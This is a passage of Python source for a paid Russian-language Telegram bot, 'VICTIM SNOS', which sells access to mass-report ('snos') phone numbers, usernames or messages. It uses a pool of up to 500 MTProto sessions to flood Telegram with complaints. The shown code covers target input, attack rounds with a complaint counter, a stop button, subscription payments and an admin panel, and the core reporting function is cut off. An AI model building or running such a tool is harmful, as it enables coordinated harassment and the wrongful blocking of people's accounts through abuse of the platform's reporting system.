        logger.info(f"Раунд {rnd}/{rounds}: {round_actions} действий за {round_time:.2f}с ({round_actions/round_time:.0f} д/с)")
        
        if cb:
            await cb(rnd, rounds, total_actions)
        
        if rnd < rounds and not stop.is_set():
            delay = max(0.1, 0.5 - (round_time * 0.1))
            await asyncio.sleep(delay)
    
    return total_actions

def parse_message_link(link: str) -> Tuple[Optional[str], Optional[int]]:
    link = link.strip()

    patterns = [
        r'(?:https?://)?t\.me/([^/\s]+)/(\d+)',
        r'(?:https?://)?telegram\.me/([^/\s]+)/(\d+)',
        r'(?:https?://)?t\.me/c/(\d+)/(\d+)',
        r'^@?([^/\s]+)/(\d+)$',
    ]

    for pattern in patterns:
        match = re.search(pattern, link)
        if match:
            channel = match.group(1)
            msg_id = int(match.group(2))
            if 't.me/c/' in link and channel.isdigit():
                channel = f"-100{channel}"
            return channel, msg_id

    return None, None

# ---------- UI ФУНКЦИИ ----------
def btn(text: str, data: str) -> InlineKeyboardButton:
    return InlineKeyboardButton(text=text, callback_data=data)

def kb(buttons: List[List[tuple]], adj: int = 1) -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    for row in buttons:
        for text, data in row:
            b.button(text=text, callback_data=data)
    b.adjust(adj)
    return b.as_markup()

def main_menu(uid: int) -> InlineKeyboardMarkup:
    btns = [
        [("💣 СНОС НАРУШИТЕЛЯ", "snos_menu")],
        [("💰 КУПИТЬ ДОСТУП", "purchase_menu")],
        [("📊 СТАТУС", "status"), ("⏹ СТОП", "stop")]
    ]
    if uid == ADMIN_ID:
        btns.append([("👑 АДМИН", "admin_menu")])
    return kb(btns, 2)

def snos_menu() -> InlineKeyboardMarkup:
    return kb([
        [("📱 ЗАБЛОКИРОВАТЬ НОМЕР", "snos_type_phone")],
        [("👤 ЗАБЛОКИРОВАТЬ USERNAME", "snos_type_username")],
        [("💬 ЗАБЛОКИРОВАТЬ СООБЩЕНИЕ", "snos_type_message")],
        [("◀️ НАЗАД", "main_menu")]
    ])

def purchase_menu() -> InlineKeyboardMarkup:
    return kb([
        [("💎 30 дней - 100₽", "buy_30d")],
        [("💎 60 дней - 200₽", "buy_60d")],
        [("👑 Навсегда - 400₽", "buy_forever")],
        [("🎁 Промокод", "use_promo")],
        [("◀️ НАЗАД", "main_menu")]
    ])

def admin_menu() -> InlineKeyboardMarkup:
    return kb([
        [("➕ Добавить", "admin_add")],
        [("➖ Удалить", "admin_remove")],
        [("🎁 Промокод", "admin_promo")],
        [("📋 Список", "admin_list")],
        [("◀️ НАЗАД", "main_menu")]
    ], 2)

async def send_msg(target, text: str, markup: InlineKeyboardMarkup = None):
    full = f"<b>🛡 VICTIM SNOS - Блокируй нарушителей</b>\n\n{text}"

    try:
        if os.path.exists(BANNER_FILE):
            if hasattr(target, 'answer_photo'):
                return await target.answer_photo(FSInputFile(BANNER_FILE), caption=full, reply_markup=markup)
            else:
                return await bot.send_photo(target if isinstance(target, int) else target.chat.id,
                                            FSInputFile(BANNER_FILE), caption=full, reply_markup=markup)
    except:
        pass

    if hasattr(target, 'answer'):
        return await target.answer(full, reply_markup=markup)
    else:
        return await bot.send_message(target if isinstance(target, int) else target.chat.id,
                                      full, reply_markup=markup)

# ---------- ОБРАБОТЧИКИ КОМАНД ----------
@dp.message(Command("start"))
async def start(msg: types.Message):
    uid = msg.from_user.id
    await msg.delete()

    if not await check_access(uid, msg):
        return

    pool = user_pools.get(uid)

    if not pool or not pool.is_ready:
        await send_msg(msg, f"🔄 Загрузка системы блокировки через MTProto...")
        asyncio.create_task(init_sessions(uid))
        await msg.answer(
            "Нажмите для проверки:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("🔄 Проверить загрузку", f"check_{uid}")]])
        )
        return

    stats = pool.get_stats()
    await send_msg(
        msg,
        f"✅ СИСТЕМА ГОТОВА К БЛОКИРОВКЕ!\n"
        f"📊 MTProto сессий: {stats['total']}/500\n"
        f"🔐 Авторизовано: {stats['authorized']}\n"
        f"🟢 Готово к атаке: {stats['available']}\n"
        f"⚡ Качество сессий: {stats['avg_quality']:.1%}",
        main_menu(uid)
    )

@dp.callback_query(F.data.startswith("check_"))
async def check(cb: types.CallbackQuery):
    uid = int(cb.data.split("_")[1])
    if uid != cb.from_user.id:
        return

    pool = user_pools.get(uid)

    if pool and pool.is_ready:
        stats = pool.get_stats()
        await cb.message.delete()
        await send_msg(
            cb.message,
            f"✅ ГОТОВО!\n"
            f"📊 MTProto сессий: {stats['total']}/500\n"
            f"🔐 Авторизовано: {stats['authorized']}\n"
            f"🔄 В очереди на пересоздание: {stats['recreation_queue']}\n"
            f"⚡ Качество: {stats['avg_quality']:.1%}",
            main_menu(uid)
        )
    else:
        await cb.answer("Загрузка...", show_alert=True)

@dp.callback_query(F.data == "main_menu")
async def main_menu_cb(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    attack_targets.clear()
    attack_types.clear()

    if not await check_access(cb.from_user.id, cb):
        return

    await cb.message.delete()
    await send_msg(cb.message, "🛡 ВЫБЕРИТЕ ДЕЙСТВИЕ:", main_menu(cb.from_user.id))

@dp.callback_query(F.data == "snos_menu")
async def snos_menu_cb(cb: types.CallbackQuery):
    if not await check_access(cb.from_user.id, cb):
        return

    await cb.message.delete()
    await send_msg(cb.message, "💣 ВЫБЕРИТЕ ТИП БЛОКИРОВКИ:", snos_menu())

@dp.callback_query(F.data.startswith("snos_type_"))
async def snos_type_select(cb: types.CallbackQuery, state: FSMContext):
    if not await check_access(cb.from_user.id, cb):
        return

    can, rem = await check_cooldown(cb.from_user.id)
    if not can:
        minutes = int(rem // 60)
        seconds = int(rem % 60)
        await cb.answer(f"⏳ Ждите {minutes}:{seconds:02d}", show_alert=True)
        return

    stype = cb.data.replace("snos_type_", "")
    attack_types[cb.from_user.id] = stype
    
    await state.set_state(AttackState.waiting_target)
    await cb.message.delete()
    
    msg_text = ""
    if stype == "phone":
        msg_text = "<b>📱 БЛОКИРОВКА НОМЕРА ЧЕРЕЗ TELEGRAM</b>\n\nВведите номер телефона нарушителя:"
    elif stype == "username":
        msg_text = "<b>👤 БЛОКИРОВКА USERNAME</b>\n\nВведите username нарушителя (с @ или без):"
    elif stype == "message":
        msg_text = "<b>💬 БЛОКИРОВКА СООБЩЕНИЯ</b>\n\nВведите ссылку на сообщение нарушителя:"
    
    await cb.message.answer(
        msg_text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("❌ Отмена", "main_menu")]])
    )

@dp.message(AttackState.waiting_target)
async def target_in(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return

    target = msg.text.strip()
    uid = msg.from_user.id
    atype = attack_types.get(uid, "")

    if atype == "message":
        channel, msg_id = parse_message_link(target)
        if not channel or not msg_id:
            await msg.delete()
            await send_msg(msg, "❌ Неверная ссылка на сообщение!")
            return
    elif atype == "username":
        target = target.replace('@', '')

    attack_targets[uid] = target
    await state.set_state(AttackState.waiting_count)
    await msg.delete()
    await msg.answer(f"🎯 Цель: {target[:30]}\n\nВведите количество раундов блокировки (1-{MAX_ROUNDS}):")

@dp.message(AttackState.waiting_count)
async def count_in(msg: types.Message, state: FSMContext):
    if not await check_access(msg.from_user.id, msg):
        return

    try:
        r = int(msg.text.strip())
        if r < 1 or r > MAX_ROUNDS:
            raise ValueError()
    except:
        await msg.delete()
        await send_msg(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
        return

    uid = msg.from_user.id
    target = attack_targets.get(uid, "")
    atype = attack_types.get(uid, "")

    await state.clear()
    await msg.delete()

    if uid in active_attacks:
        await send_msg(msg, "❌ Блокировка уже запущена!")
        return

    stop = asyncio.Event()
    active_attacks[uid] = stop

    display = target[:40] + "..." if len(target) > 40 else target
    st = await bot.send_message(uid, f"<b>💣 ЗАПУСК TELEGRAM БЛОКИРОВКИ</b>\n\n🎯 Нарушитель: {display}\n🔄 0/{r} раундов")

    async def prog(cur, tot, sent):
        try:
            percent = int((cur / tot) * 10)
            bar = "▓" * percent + "░" * (10 - percent)
            await st.edit_text(
                f"<b>💣 TELEGRAM БЛОКИРОВКА АКТИВНА</b>\n\n"
                f"🎯 Нарушитель: {display}\n"
                f"📊 [{bar}] {cur}/{tot} раундов\n"
                f"💥 Отправлено жалоб: {sent}",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("⏹ ОСТАНОВИТЬ", "stop_attack")]])
            )
        except:
            pass

    start_time = time.time()
    try:
        total = await massive_telegram_attack(uid, target, r, atype, stop, prog)
        
        user_last_action[uid] = time.time()
        elapsed = time.time() - start_time
        
        await st.edit_text(
            f"<b>✅ TELEGRAM БЛОКИРОВКА ЗАВЕРШЕНА</b>\n\n"
            f"🎯 Нарушитель: {display}\n"
            f"💥 Отправлено жалоб: {total}\n"
            f"⏱ Время: {elapsed:.1f}с\n"
            f"⚡ Средняя скорость: {total/elapsed:.0f}/сек\n\n"
            f"⏳ Кулдаун: 3 минуты",
            reply_markup=main_menu(uid)
        )
    except Exception as e:
        logger.error(f"Ошибка блокировки: {e}")
        await st.edit_text("<b>❌ ОШИБКА БЛОКИРОВКИ</b>", reply_markup=main_menu(uid))
    finally:
        if uid in active_attacks:
            del active_attacks[uid]
        attack_targets.pop(uid, None)
        attack_types.pop(uid, None)

@dp.callback_query(F.data == "stop_attack")
async def stop_btn(cb: types.CallbackQuery):
    uid = cb.from_user.id
    if uid in active_attacks:
        active_attacks[uid].set()
        del active_attacks[uid]
        await cb.answer("✅ Блокировка остановлена", show_alert=True)
    else:
        await cb.answer("❌ Нет активных блокировок", show_alert=True)
    
    await cb.message.delete()
    await send_msg(cb.message, "⏹ БЛОКИРОВКА ОСТАНОВЛЕНА", main_menu(uid))

@dp.callback_query(F.data == "status")
async def status_cb(cb: types.CallbackQuery):
    if not await check_access(cb.from_user.id, cb):
        return

    uid = cb.from_user.id
    pool = user_pools.get(uid)
    
    can, rem = await check_cooldown(uid)
    cooldown_text = ""
    if not can:
        minutes = int(rem // 60)
        seconds = int(rem % 60)
        cooldown_text = f"\n⏳ Кулдаун: {minutes}:{seconds:02d}"

    if pool:
        stats = pool.get_stats()
        txt = (f"📊 MTProto сессий: {stats['total']}/500\n"
               f"🔐 Авторизовано: {stats['authorized']}\n"
               f"🟢 Готово к атаке: {stats['available']}\n"
               f"🔄 На пересоздании: {stats['recreation_queue']}\n"
               f"⚡ Качество: {stats['avg_quality']:.1%}"
               f"{cooldown_text}")
    else:
        txt = f"🔄 Загрузка системы...{cooldown_text}"

    await cb.message.delete()
    await send_msg(cb.message, txt, main_menu(uid))

# Платежная система
@dp.callback_query(F.data == "purchase_menu")
async def purch_menu(cb: types.CallbackQuery):
    await cb.message.delete()
    await send_msg(cb.message, "💰 ПОКУПКА ДОСТУПА", purchase_menu())

@dp.callback_query(F.data.startswith("buy_"))
async def buy(cb: types.CallbackQuery):
    dur = cb.data.replace("buy_", "")
    prices = {"30d": ("30 дней", 100), "60d": ("60 дней", 200), "forever": ("Навсегда", 400)}
    name, price = prices[dur]

    await bot.send_invoice(
        chat_id=cb.from_user.id,
        title=f"VICTIM SNOS - {name}",
        description=f"Доступ к блокировке нарушителей на {name}",
        payload=f"sub_{dur}",
        provider_token=PAYMENT_PROVIDER_TOKEN,
        currency="RUB",
        prices=[LabeledPrice(label=name, amount=price * 100)],
        start_parameter="vs"
    )
    await cb.message.delete()

@dp.pre_checkout_query()
async def pre_check(q: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(q.id, ok=True)

@dp.message(F.successful_payment)
async def pay_ok(msg: types.Message):
    p = msg.successful_payment.invoice_payload
    if p.startswith("sub_"):
        d = p.replace("sub_", "")
        if d == "forever":
            add_sub(msg.from_user.id, forever=True)
            t = "навсегда"
        else:
            add_sub(msg.from_user.id, days=int(d.replace("d", "")))
            t = f"на {d}"
        await msg.answer(f"✅ ОПЛАТА УСПЕШНА!\nДоступ к блокировке нарушителей {t}\n/start")

# Админ панель
@dp.callback_query(F.data == "admin_menu")
async def admin_menu_cb(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    await cb.message.delete()
    await send_msg(cb.message, "👑 АДМИН ПАНЕЛЬ", admin_menu())

@dp.callback_query(F.data == "admin_add")
async def admin_add_start(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.delete()
    await cb.message.answer("Введите ID пользователя для добавления:")

@dp.message(AdminState.waiting_user_id)
async def admin_add_user(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        uid = int(msg.text.strip())
        add_sub(uid, forever=True)
        await msg.delete()
        await send_msg(msg, f"✅ Пользователь {uid} добавлен навсегда", admin_menu())
    except:
        await msg.delete()
        await send_msg(msg, "❌ Ошибка! Введите корректный ID", admin_menu())
    await state.clear()

@dp.callback_query(F.data == "admin_remove")
async def admin_remove_start(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.delete()
    await cb.message.answer("Введите ID пользователя для удаления:")

@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_remove_user(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        uid = str(int(msg.text.strip()))
        if uid in ALLOWED_USERS:
            del ALLOWED_USERS[uid]
            save_allowed()
            await msg.delete()
            await send_msg(msg, f"✅ Пользователь {uid} удален", admin_menu())
        else:
            await msg.delete()
            await send_msg(msg, f"❌ Пользователь {uid} не найден", admin_menu())
    except:
        await msg.delete()
        await send_msg(msg, "❌ Ошибка!", admin_menu())
    await state.clear()

@dp.callback_query(F.data == "admin_list")
async def admin_list_cb(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    
    txt = "<b>👑 СПИСОК ПОЛЬЗОВАТЕЛЕЙ</b>\n\n"
    if ALLOWED_USERS:
        for uid, data in list(ALLOWED_USERS.items())[:30]:
            exp = data.get('expire_date', 'forever')
            if exp != 'forever':
                try:
                    exp_date = datetime.fromisoformat(exp)
                    days_left = (exp_date - datetime.now()).days
                    exp_text = f"{days_left}д"
                except:
                    exp_text = exp
            else:
                exp_text = "∞"
            txt += f"<code>{uid}</code> - {exp_text}\n"
    else:
        txt += "Пусто"
    
    await cb.message.delete()
    await send_msg(cb.message, txt, admin_menu())

# ---------- ЗАПУСК ----------
async def on_start():
    load_all()
    os.makedirs("sessions", exist_ok=True)
    logger.info("🛡 VICTIM SNOS - TELEGRAM БОМБА ЗАПУЩЕНА С MTPROTO!")

async def on_shutdown():
    global http_session
    if http_session and not http_session.closed:
        await http_session.close()
    
    # Закрытие всех сессий
    for pool in user_pools.values():
        for session in pool.sessions:
            try:
                if session.client.is_connected:
                    await session.client.disconnect()
            except:
                pass

async def main():
    await on_start()
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    finally:
        await on_shutdown()

if __name__ == "__main__":
    asyncio.run(main())

if __name__ == "__main__":
    asyncio.run(main())
